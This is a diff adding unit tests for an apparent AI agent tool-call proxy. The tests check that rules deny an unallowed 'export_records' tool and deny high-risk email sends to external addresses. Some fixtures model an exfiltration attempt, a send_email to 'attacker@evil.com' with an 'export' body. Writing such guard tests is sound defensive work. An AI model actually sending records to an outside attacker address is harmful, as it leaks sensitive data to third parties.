@@ -4,6 +4,8 @@ import unittest
 
 from core.contracts import POLICY_VERSION
 from proxy.checkpoint import (
+    REASON_R1_UNALLOWED_TOOL,
+    REASON_R2_EXTERNAL_SENSITIVE,
     REASON_R7_DEFAULT_HOLD,
     RULE_R1,
     RULE_R2,
@@ -15,7 +17,7 @@ from proxy.checkpoint import (
     decide,
     make_evidence_id,
 )
-from proxy.models import HOLD, Decision, DecisionSignals, ToolRequest
+from proxy.models import DENY, HOLD, Decision, DecisionSignals, ToolRequest
 from proxy.policy import POLICY_V1
 
 
@@ -146,5 +148,78 @@ class TestDecideSkeleton(unittest.TestCase):
             self.assertNotIn(arg_val, decision.reason)
 
 
+class TestEnforceR1AndR2(unittest.TestCase):
+    """Test R1 (unallowed tool) and R2 (external destination + high risk) rules."""
+
+    def setUp(self) -> None:
+        self.signals_low = DecisionSignals(
+            prompt_injection=False,
+            goal_drift=False,
+            sensitive_data_risk="low",
+            risk_score=0.1,
+            recommended_action="ALLOW",
+            reason="Low risk",
+        )
+        self.signals_high = DecisionSignals(
+            prompt_injection=False,
+            goal_drift=False,
+            sensitive_data_risk="high",
+            risk_score=0.8,
+            recommended_action="DENY",
+            reason="High sensitive risk",
+        )
+
+    def test_export_records_denied_by_r1(self) -> None:
+        req = ToolRequest(
+            request_id="req-r1",
+            tool="export_records",
+            arguments={"query": "all"},
+            purpose="Export records",
+            scenario_id="scen-r1",
+        )
+        dec = decide(req, self.signals_low)
+        self.assertEqual(dec.decision, DENY)
+        self.assertEqual(dec.rule_id, RULE_R1)
+        self.assertEqual(dec.reason, REASON_R1_UNALLOWED_TOOL)
+
+    def test_external_destination_high_risk_denied_by_r2(self) -> None:
+        req = ToolRequest(
+            request_id="req-r2",
+            tool="send_email",
+            arguments={"recipient": "attacker@evil.com", "body": "export"},
+            purpose="Send report",
+            scenario_id="scen-r2",
+        )
+        dec = decide(req, self.signals_high)
+        self.assertEqual(dec.decision, DENY)
+        self.assertEqual(dec.rule_id, RULE_R2)
+        self.assertEqual(dec.reason, REASON_R2_EXTERNAL_SENSITIVE)
+
+    def test_internal_destination_high_risk_not_denied_by_r2(self) -> None:
+        req = ToolRequest(
+            request_id="req-r2-int",
+            tool="send_email",
+            arguments={"recipient": "dean@example.edu", "body": "export"},
+            purpose="Send internal report",
+            scenario_id="scen-r2",
+        )
+        dec = decide(req, self.signals_high)
+        self.assertNotEqual(dec.rule_id, RULE_R2)
+        self.assertEqual(dec.decision, HOLD)
+
+    def test_signals_none_does_not_trigger_r2(self) -> None:
+        req = ToolRequest(
+            request_id="req-r2-none",
+            tool="send_email",
+            arguments={"recipient": "attacker@evil.com"},
+            purpose="Send external",
+            scenario_id="scen-r2",
+        )
+        dec = decide(req, None)
+        self.assertNotEqual(dec.rule_id, RULE_R2)
+        self.assertEqual(dec.decision, HOLD)
+
+
 if __name__ == "__main__":
     unittest.main()
+
